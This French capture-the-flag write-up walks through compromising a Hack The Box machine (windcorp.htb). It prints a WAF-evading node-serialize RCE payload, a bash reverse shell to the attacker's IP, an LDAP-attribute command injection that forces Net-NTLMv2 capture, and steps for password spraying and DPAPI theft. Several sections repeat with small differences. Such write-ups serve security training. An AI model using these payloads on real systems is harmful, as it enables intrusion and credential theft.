![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

### Énumération et Scanning

Je débute par un scan **Nmap** agressif pour identifier les surfaces d'attaque. Bien que la machine soit étiquetée comme Windows sur HTB, les premiers résultats pointent vers un environnement hybride ou conteneurisé.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.179

# Scan de services sur les ports découverts
nmap -p 22,80 -sCV 10.10.11.179
```

Le scan révèle :
*   **Port 22 (SSH)** : OpenSSH 8.4p1 (Debian).
*   **Port 80 (HTTP)** : Nginx 1.18.0. Le titre renvoie un **403 Forbidden**, suggérant un **Virtual Hosting**.

### Découverte de sous-domaines

L'accès direct à l'IP redirige vers `www.windcorp.htb`. J'utilise **ffuf** pour découvrir d'autres sous-domaines potentiels en manipulant le header `Host`.

```bash
ffuf -u http://10.10.11.179 -H "Host: FUZZ.windcorp.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
```

Le fuzzing identifie immédiatement **portal.windcorp.htb**. J'ajoute les entrées à mon fichier `/etc/hosts`.

### Analyse du portail Web

Le site `portal.windcorp.htb` présente une mire de connexion. Une tentative avec des identifiants par défaut (**admin:admin**) me permet d'accéder à l'interface. L'analyse des headers HTTP révèle l'utilisation du framework **Express** (Node.js).

Lors de l'authentification, l'application définit un cookie nommé `profile`.

```http
Set-Cookie: profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2ODAwMjM5Nzc1NzF9; Max-Age=604800; HttpOnly
```

Le décodage **Base64** du cookie donne un objet JSON :
`{"username":"admin","admin":"1","logon":1680023977571}`

### Vecteur d'attaque : JSON Deserialization

La présence d'un objet JSON sérialisé dans un cookie sur une application **ExpressJS** est un indicateur fort d'une vulnérabilité de **Insecure Deserialization**. Si l'application utilise la fonction `unserialize()` du module `node-serialize`, il est possible d'exécuter du code arbitraire en utilisant l'identifiant de fonction `_$$ND_FUNC$$_`.

> **Schéma Mental : Deserialization to RCE**
> 1. **Input** : L'attaquant fournit un cookie Base64 contenant un objet JSON malveillant.
> 2. **Trigger** : L'application appelle `unserialize(cookie)`.
> 3. **Execution** : Le préfixe `_$$ND_FUNC$$_` force le moteur JavaScript à évaluer la fonction immédiatement lors de la désérialisation.
> 4. **Payload** : Utilisation de `require('child_process').exec()` pour sortir du contexte applicatif.

### Bypass du WAF (ModSecurity)

Une tentative d'injection directe est bloquée par un **WAF (ModSecurity)**, renvoyant une erreur **403 Forbidden**. Le WAF semble détecter les signatures classiques comme `_$$ND_FUNC$$_` ou `function()`.

Pour contourner ces filtres, j'utilise l'encodage **Unicode** pour masquer les caractères spéciaux (`$` devient `\u0024` et `{` devient `\u007b`).

**Payload de test (Ping) :**
```json
{
"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('ping -c 1 10.10.14.6', function(error,stdout,stderr) {console.log(stdout) });\n}()"
}
```

Après encodage en **Base64** et injection dans le cookie, je reçois une requête ICMP sur mon interface `tun0`, confirmant la **RCE**.

### Obtention du premier Shell

Je remplace le ping par un **Reverse Shell** classique en Bash.

**Payload final :**
```json
{
"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"', function(error,stdout,stderr) {console.log(stdout) });\n}()"
}
```

```bash
# Sur ma machine d'attaque
nc -lnvp 443
```

L'exécution réussit et je récupère un shell en tant que l'utilisateur **webster**. L'environnement est un conteneur ou une VM Linux Debian, bien que la cible finale soit Windows.

```bash
# Stabilisation du shell
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
reset
export TERM=xterm
```

---

### Énumération Interne & Mouvement Latéral

Une fois le pied posé sur la machine **webserver** (une VM Linux Debian 11), mon objectif est de sortir de ce conteneur/VM pour atteindre l'infrastructure **Active Directory** sous-jacente.

#### 1. Énumération Post-Exploitation (Linux)

L'énumération du système de fichiers révèle un fichier intéressant dans le répertoire personnel de l'utilisateur `webster` : `backup.zip`. L'analyse des métadonnées montre que l'archive utilise l'algorithme de chiffrement obsolète **ZipCrypto**.

```bash
# Analyse des méthodes de chiffrement de l'archive
7z l -slt backup.zip | grep -E "Path|Method"
# Vérification du CRC32 pour une attaque à texte clair connu
python3 -c "import binascii; print(hex(binascii.crc32(open('/etc/passwd','rb').read()) & 0xffffffff))"
```

L'archive contient `/etc/passwd`, un fichier dont je possède déjà le contenu en clair sur le système. Cela rend l'archive vulnérable à une **Known Plaintext Attack**.

> **Schéma Mental : Attaque ZipCrypto**
> 1. **Cible** : Archive chiffrée avec l'algorithme ZipCrypto (Stream Cipher).
> 2. **Condition** : Posséder au moins 12 octets du texte clair d'un fichier présent dans l'archive (ici `/etc/passwd`).
> 3. **Action** : Utiliser `bkcrack` pour déduire les clés internes du chiffrement sans casser le mot de passe lui-même.
> 4. **Résultat** : Déchiffrement de l'intégralité de l'archive.

#### 2. Escalade de Privilèges : De Webster à Root

Grâce à `bkcrack`, je récupère les fichiers de configuration de **SSSD** (System Security Services Daemon), qui gère l'authentification AD sur cette machine Linux.

```bash
# Extraction des clés et déchiffrement
bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd
bkcrack -C backup.zip -k [KEYS] -U decrypted.zip pass
```

Dans les fichiers extraits, j'accède à la base de données locale de SSSD : `/var/lib/sss/db/cache_windcorp.htb.ldb`. Cette base contient des **hashes de mots de passe mis en cache** pour les utilisateurs du domaine s'étant connectés à la VM.

```bash
# Extraction du hash SHA512-crypt de Ray.Duncan
tdbdump cache_windcorp.htb.ldb | grep -i "cachedPassword"
# Cracking avec Hashcat (Mode 1800)
hashcat -m 1800 ray_hash.txt /usr/share/wordlists/rockyou.txt
```

Le mot de passe de `Ray.Duncan` est `pantera`. Ce dernier dispose de privilèges sudo via Kerberos (**ksu**), me permettant de devenir **root** sur la VM Linux.

#### 3. Pivot vers l'Active Directory

Depuis la VM, j'identifie le **Domain Controller** (DC) : `hope.windcorp.htb` (192.168.0.2). Pour interagir avec le domaine depuis ma machine d'attaque, j'établis un **SOCKS Tunnel** via SSH et configure Kerberos localement.

```bash
# Tunneling SSH et redirection de port pour SMB
ssh -i id_rsa root@10.10.11.179 -D 1080 -R 0.0.0.0:445:127.0.0.1:445
# Configuration Kerberos (/etc/krb5.conf)
# [realms] WINDCORP.HTB = { kdc = hope.windcorp.htb }
proxychains kinit ray.duncan
```

L'énumération des partages SMB révèle un partage non standard : `WC-Share`. Il contient un fichier `debug-users.txt` qui semble être mis à jour dynamiquement.

#### 4. Mouvement Latéral : Injection de Commandes LDAP

L'analyse d'un script PowerShell trouvé dans `NETLOGON` (`form.ps1`) suggère que les attributs LDAP des utilisateurs, notamment le champ **mobile**, sont utilisés pour générer des rapports ou des fichiers de debug.

> **Schéma Mental : Injection via Attribut LDAP**
> 1. **Vecteur** : Un script côté serveur (DC) lit l'attribut `mobile` des utilisateurs AD via une requête LDAP.
> 2. **Vulnérabilité** : Le script concatène cette valeur dans une commande système sans assainissement.
> 3. **Exploitation** : Modifier mon propre attribut `mobile` (ou celui de Ray.Duncan) pour y injecter une commande.
> 4. **Déclencheur** : Attendre l'exécution de la tâche planifiée sur le DC.

J'utilise `ldapmodify` pour injecter une commande visant à capturer un hash **Net-NTLMv2**.

```bash
# Modification de l'attribut mobile pour forcer une connexion SMB
echo -e "dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: \$(net use \\\\webserver.windcorp.htb\\df)" | ldapmodify -H ldap://hope.windcorp.htb
```

En recevant la connexion sur mon relais via le tunnel SSH, je capture le hash de l'utilisateur `scriptrunner`. Après cracking, j'obtiens le mot de passe : `!@p%i&J#iNNo1T2`.

#### 5. Password Spraying & Accès Bob.Wood

Le compte `scriptrunner` est limité. Cependant, dans un environnement AD, les mots de passe de service ou de scripts sont parfois réutilisés. Je procède à un **Password Spraying** sur l'ensemble des utilisateurs du domaine récupérés via LDAP.

```bash
# Récupération de la liste des utilisateurs
ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt
# Password Spraying avec Kerbrute
./kerbrute passwordspray -d windcorp.htb users.txt '!@p%i&J#iNNo1T2'
```

Le spray révèle que l'utilisateur **Bob.Wood** utilise le même mot de passe. Bob.Wood fait partie du groupe **IT**, ce qui lui donne un accès **WinRM** sur le Domain Controller.

```bash
# Connexion initiale au DC
evil-winrm -i hope.windcorp.htb -u Bob.Wood -p '!@p%i&J#iNNo1T2'
```

---

### Élévation de Privilèges sur la VM Linux (webserver)

Une fois l'accès initial obtenu en tant que **webster**, l'énumération locale révèle un fichier `backup.zip` dans le répertoire personnel. L'analyse des métadonnées via `7z l -slt` confirme que l'archive utilise l'algorithme de chiffrement obsolète **ZipCrypto**.

#### Attaque par Texte Clair Connu (Known Plaintext Attack)

Puisque `/etc/passwd` est présent dans l'archive et que son **CRC32** (`D00EEE74`) correspond exactement au fichier `/etc/passwd` actuel du système, une attaque avec **bkcrack** est possible.

> **Schéma Mental :**
> Archive chiffrée (ZipCrypto) + Fichier connu en clair (/etc/passwd) -> Récupération des clés internes -> Déchiffrement de l'archive sans le mot de passe original.

```bash
# Génération de l'archive de référence
zip plain.zip /etc/passwd

# Attaque pour récupérer les clés ZipCrypto
bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd

# Extraction des fichiers avec les clés trouvées
bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U decrypted.zip pass
```

#### Analyse du cache SSSD & Root

L'archive contient une copie de `/var/lib/sss/db/`, incluant la base de données **LDB** de **SSSD** (`cache_windcorp.htb.ldb`). Ce fichier stocke les credentials des utilisateurs du domaine s'étant connectés à la machine.

```bash
# Extraction du hash SHA512-crypt de l'utilisateur Ray.Duncan
tdbdump cache_windcorp.htb.ldb | grep cachedPassword
# Hash : $6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035...
# Crack via Hashcat (m 1800) : pantera
```

Avec les identifiants de `Ray.Duncan`, j'utilise **ksu** (**Kerberos SU**) pour obtenir les privilèges **root**. **ksu** s'appuie sur le ticket Kerberos pour autoriser le changement d'identité vers **root**.

```bash
kinit ray.duncan
ksu
# Authenticated ray.duncan@WINDCORP.HTB -> Root access granted
```

---

### Compromission du Domaine (Pivot Windows)

En tant que **root**, j'énumère le **Domain Controller** (`hope.windcorp.htb`). Un partage SMB nommé `WC-Share` contient un fichier `debug-users.txt` mis à jour dynamiquement.

#### Injection de Commande via Attribut LDAP

L'analyse suggère qu'un script côté serveur (Windows) récupère l'attribut `mobile` des utilisateurs AD pour générer ce fichier. En modifiant mon propre attribut `mobile` via `ldapmodify`, je peux tester une **Command Injection**.

> **Schéma Mental :**
> Modification Attribut LDAP (Linux) -> Script de synchronisation (Windows) -> Exécution de commande avec les privilèges du compte de service.

```bash
# Injection pour identifier l'utilisateur exécutant le script
echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(whoami)' | ldapmodify -H ldap://hope.windcorp.htb

# Résultat dans debug-users.txt : windcorp\scriptrunner
```

#### Capture de Hash via SSH Remote Port Forwarding

Pour récupérer le hash de `scriptrunner`, je force une connexion SMB vers ma machine. Comme le flux direct est bloqué, j'utilise un **Remote Tunnel** SSH pour rediriger le port 445 de la VM Linux vers mon instance **Responder** ou **smbserver.py**.

```bash
# Sur ma machine (Kala) : redirection du port 445 distant vers le local
ssh -R 445:127.0.0.1:445 root@10.10.11.179

# Injection LDAP pour déclencher la connexion SMB
# mobile: $(net use \\webserver.windcorp.htb\df)

# Capture du Net-NTLMv2 sur mon hôte
smbserver.py df . -smb2support
# Hash cracké : !@p%i&J#iNNo1T2
```

---

### Domination Totale (Beyond Root)

Le mot de passe de `scriptrunner` est réutilisé par d'autres comptes. Un **Password Spraying** via **kerbrute** identifie l'utilisateur `Bob.Wood`.

```bash
./kerbrute passwordspray -d windcorp.htb domain_users.txt '!@p%i&J#iNNo1T2'
# [+] VALID LOGIN: Bob.Wood@windcorp.htb
```

`Bob.Wood` a accès au **Domain Controller** via **WinRM**. L'analyse post-exploitation révèle que cet utilisateur utilise Microsoft Edge. Les credentials stockés dans le navigateur sont protégés par **DPAPI** (**Data Protection API**).

#### Analyse Beyond Root : Extraction DPAPI

En utilisant des outils comme **Mimikatz** ou **SharpDPAPI** sur la session de `Bob.Wood`, il est possible d'extraire les **MasterKeys** de l'utilisateur pour déchiffrer les secrets stockés.

1.  **Extraction de la MasterKey** : Localisée dans `%APPDATA%\Microsoft\Protect\{SID}`.
2.  **Déchiffrement des Login Data d'Edge** : Le fichier SQLite `Login Data` contient les mots de passe chiffrés.
3.  **Compromission Admin** : Les credentials d'un **Domain Admin** sont ainsi récupérés, permettant une compromission totale de la forêt AD.

> **Schéma Mental Final :**
> Password Reuse -> WinRM Access -> DPAPI Post-Exploitation -> Edge Credential Decryption -> Domain Admin.